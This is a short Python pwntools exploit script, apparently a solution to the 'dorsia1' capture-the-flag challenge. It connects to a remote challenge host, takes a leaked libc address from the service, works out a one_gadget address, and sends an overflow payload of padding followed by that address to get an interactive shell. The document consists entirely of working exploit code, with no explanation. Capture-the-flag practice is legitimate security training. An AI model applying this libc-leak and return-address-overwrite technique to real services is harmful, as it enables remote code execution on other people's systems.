from pwn import *

p = remote("dorsia1.wpictf.xyz", 31339)
#p= process("./chall")
one_gadget_off = 0x4f322
system = int(p.recvline(),16) - 765772
libc_base = system - 0x04f440
one_gadget = libc_base + one_gadget_off
padd = "AAAAA"
padd += p64(0) * 9
print hex(libc_base)
print hex(system) 
print hex(one_gadget)
payload = ""
payload += padd	
payload += p64(one_gadget)

p.send(payload)
p.interactive()
